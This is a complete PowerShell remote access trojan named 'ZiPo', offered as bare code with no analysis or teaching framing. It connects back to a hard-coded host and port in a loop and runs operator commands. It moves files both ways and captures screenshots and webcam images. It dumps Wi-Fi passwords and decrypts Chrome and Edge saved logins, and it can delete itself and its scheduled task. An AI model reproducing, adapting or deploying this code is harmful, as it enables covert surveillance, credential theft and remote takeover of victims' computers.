function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666
    $currentDir = Get-Location

    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
        } else {
            return "[ERROR]::FILE NOT FOUND: $path"
        }
    }

    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
        return "[DOWNLOADED] $out"
    }

    function Take-Screenshot {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
                                         [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
        $path = "$env:TEMP\snap.png"
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bmp.Dispose()
        return Upload-File $path
    }

    function Capture-Webcam {
        try {
            $dev = (New-Object -ComObject WIA.DeviceManager).DeviceInfos.Item(1).Connect()
            $img = $dev.Items.Item(1).Transfer()
            $file = "$env:TEMP\webcam.jpg"
            $img.SaveFile($file)
            return Upload-File $file
        }
        catch {
            return "[ERROR] Webcam not available"
        }
    }

    function Get-WiFiCreds {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }

        $results = ""
        foreach ($profile in $profiles) {
            $results += "[$profile]`n"
            $results += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") + "`n"
        }
        return $results
    }

    function Get-BrowserCreds {
        try {
            $local = "$env:LOCALAPPDATA"
            $paths = @(
                "$local\Google\Chrome\User Data\Default\Login Data",
                "$local\Microsoft\Edge\User Data\Default\Login Data"
            )
            $temp = "$env:TEMP\browserlogins.db"
            $output = ""

            foreach ($path in $paths) {
                if (Test-Path $path) {
                    Copy-Item $path $temp -Force
                    Add-Type -AssemblyName System.Data.SQLite
                    $conn = New-Object Data.SQLite.SQLiteConnection "Data Source=$temp"
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                    $reader = $cmd.ExecuteReader()
                    while ($reader.Read()) {
                        $url = $reader.GetValue(0)
                        $user = $reader.GetValue(1)
                        $passEnc = $reader.GetValue(2)
                        $pass = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passEnc, $null, 'CurrentUser'))
                        $output += "[$url] $user / $pass`n"
                    }
                    $reader.Close()
                    $conn.Close()
                    Remove-Item $temp -Force
                }
            }
            return $output
        }
        catch {
            return "[ERROR] Failed to extract browser creds: $($_.Exception.Message)"
        }
    }

    function Tree-List {
        return Get-ChildItem -Path $currentDir -Recurse | Select-Object FullName | Out-String
    }

    function Self-Destruct {
        $path = $MyInvocation.MyCommand.Path
        schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
        Remove-Item -Path $path -Force
        exit
    }

    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()
            [byte[]]$buffer = 0..65535 | % { 0 }

            $esc = [char]27
            $clear = "$esc[2J$esc[H"
            $banner = @"
${esc}[31m
   ________ _______  ________  ________
  |\  _____\\  ___ \|\   __  \|\   ____\
  \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
   \ \   __\ \ \  \_|\ \ \   __  \ \  \   
    \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
     \ \__\    \ \_______\ \__\ \__\ \_______\
      \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m

${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
------------------------------------------------------------
"@

            $intro = $clear + $banner + "`nPS $currentDir> "
            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
            $stream.Write($bbytes, 0, $bbytes.Length)
            $stream.Flush()

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()

                try {
                    if ($cmd.StartsWith("!get")) {
                        $path = $cmd.Substring(4).Trim()
                        $response = Upload-File $path
                    }
                    elseif ($cmd.StartsWith("!post")) {
                        $parts = $cmd.Split("::")
                        if ($parts.Length -eq 3) {
                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
                        } else {
                            $response = "[ERROR] INVALID POST FORMAT"
                        }
                    }
                    elseif ($cmd -like "cd *") {
                        $target = $cmd.Substring(3).Trim()
                        Set-Location -Path $target
                        $currentDir = Get-Location
                        $response = ""
                    }
                    elseif ($cmd -eq "!sysinfo") {
                        $response = Get-ComputerInfo | Out-String
                    }
                    elseif ($cmd -eq "!screenshot") {
                        $response = Take-Screenshot
                    }
                    elseif ($cmd -eq "!webcam") {
                        $response = Capture-Webcam
                    }
                    elseif ($cmd -eq "!wifi") {
                        $response = Get-WiFiCreds
                    }
                    elseif ($cmd -eq "!creds") {
                        $response = Get-BrowserCreds
                    }
                    elseif ($cmd -eq "!tree") {
                        $response = Tree-List
                    }
                    elseif ($cmd -eq "!selfdestruct") {
                        $response = "[!] Self-destruct initiated..."
                        $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                        $stream.Write($outBytes, 0, $outBytes.Length)
                        $stream.Flush()
                        Self-Destruct
                    }
                    else {
                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
                        $output = & $sb 2>&1 | Out-String
                        $response = $output.TrimEnd()
                    }
                }
                catch {
                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                }

                $response += "`nPS $currentDir> "
                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
